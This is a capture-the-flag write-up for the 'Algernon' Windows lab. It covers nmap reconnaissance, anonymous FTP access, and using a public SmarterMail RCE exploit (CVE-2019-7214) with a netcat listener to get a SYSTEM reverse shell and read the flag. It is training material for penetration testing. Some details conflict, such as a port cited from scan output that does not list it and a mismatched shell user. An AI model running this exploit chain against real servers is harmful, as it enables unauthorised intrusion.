# ​Proving Grounds - Easy Windows - Algernon

- **Points** 10
- **Level** Easy
- **Number of Flags** 1
- **Vector Type** SmarterMail
- **IP** 192.168.53.65
- **Job Roles** Network Penetration Tester
- **Skills** Web Application Attacks

---

# About

In this lab, we will exploit a remote code execution vulnerability in build 6985 of the SmarterMail application. This exercise enhances your skills in identifying and exploiting vulnerabilities for gaining access to systems.

---

# Summary

This lab demonstrates exploiting a remote code execution vulnerability in SmarterMail build 6985 to gain SYSTEM-level access on a Windows server. Learners will identify the application version, leverage an RCE exploit, and use a reverse shell payload to compromise the target. This lab emphasizes web application exploitation and highlights the risks of unpatched software.

---

## Learning Objectives

**After completion of this lab, learners will be able to:**

- Enumerate open ports and services to identify the SmarterMail application running on port 9998.
- Confirm the application version and search for applicable exploits.
- Deploy the SmarterMail RCE exploit with a reverse shell payload.
- Verify SYSTEM-level access upon successful exploitation.
- Understand the importance of applying patches to mitigate known vulnerabilities.


---

## Recon

- NMap scan

```bash
nmap -A 192.168.53.65
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-17 09:10 UTC
Nmap scan report for 192.168.53.65
Host is up (0.00086s latency).
Not shown: 994 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 04-29-20  10:31PM       <DIR>          ImapRetrieval
| 07-17-25  02:07AM       <DIR>          Logs
| 04-29-20  10:31PM       <DIR>          PopRetrieval
|_04-29-20  10:32PM       <DIR>          Spool
| ftp-syst: 
|_  SYST: Windows_NT
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-title: IIS Windows
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
9998/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
| uptime-agent-info: HTTP/1.1 400 Bad Request\x0D
| Content-Type: text/html; charset=us-ascii\x0D
| Server: Microsoft-HTTPAPI/2.0\x0D
| Date: Thu, 17 Jul 2025 09:11:05 GMT\x0D
| Connection: close\x0D
| Content-Length: 326\x0D
| \x0D
| <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN""http://www.w3.org/TR/html4/strict.dtd">\x0D
| <HTML><HEAD><TITLE>Bad Request</TITLE>\x0D
| <META HTTP-EQUIV="Content-Type" Content="text/html; charset=us-ascii"></HEAD>\x0D
| <BODY><h2>Bad Request - Invalid Verb</h2>\x0D
| <hr><p>HTTP Error 400. The request verb is invalid.</p>\x0D
|_</BODY></HTML>\x0D
|_http-server-header: Microsoft-IIS/10.0
Device type: general purpose
Running: Microsoft Windows 10
OS CPE: cpe:/o:microsoft:windows_10
OS details: Microsoft Windows 10 1903 - 21H1
Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-07-17T09:11:05
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required


OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 37.88 seconds

```


---

## Basic Enumeration

- Anonymous FTP login is enabled, allowing unauthenticated access.

```bash
ftp 192.168.53.65
Connected to 192.168.53.65.
220 Microsoft FTP Service
Name (192.168.53.65:kali): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password: 
230 User logged in.
Remote system type is Windows_NT.
```

**Note: No sensitive data was found in the accessible FTP directories.(Rabbit Hole)**

- Port 80 is just a windows IIS page.
- Port 9998 is a login page.

---

## Port 9998 Enumeration

- Opening port 9998 in browser redirects to http://192.168.53.65:9998/interface/root#/login.
- Which is a login page belongs to **smartmailer**.
- Researching exploits for SmarterMail on Google we come across an interesting exploit.
- Exploit link https://www.exploit-db.com/exploits/49216

---

## Exploiting CVE-2019-7214 to get initial access

- Looking at the `nmap` results from earlier we do have .NET remoting running on port 17001. As such this exploit should be applicable to the target machine.
- Exploit configuration . We just need to update target ip (HOST) and our machine ip (LHOST) in the script.
- Then we need to start a netcat listener to get reverse shell.

```bash
nc -lvnp 4444
```

- After starting the listener, we can execute the exploit to get reverse shell.

```bash
python3 49216
```
- We will get the shell in our netcat listener as **Administrator**

```bash
nc -lvnp 4444 
listening on [any] 4444 ...
connect to [192.168.49.53] from (UNKNOWN) [192.168.53.65] 49906
bash -i
PS C:\Windows\system32> whoami
nt authority\system
PS C:\Windows\system32> 
```
---

## Flag Extraction

- Now we can just navigate to **C:\Users\Administrator\Desktop** and read the flag inside **proof.txt** file.

```bash
PS C:\Users\Administrator\Desktop> ls


    Directory: C:\Users\Administrator\Desktop


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
-a----        4/29/2020   9:29 PM           1450 Microsoft Edge.lnk                                                    
-a----        7/17/2025   2:07 AM             34 proof.txt                                                             


PS C:\Users\Administrator\Desktop> type proof.txt
76fb8ea14********1c2cbbb
```

---

## Author

[Zishan Ahamed Thandar](https://zishanadthandar.github.io)
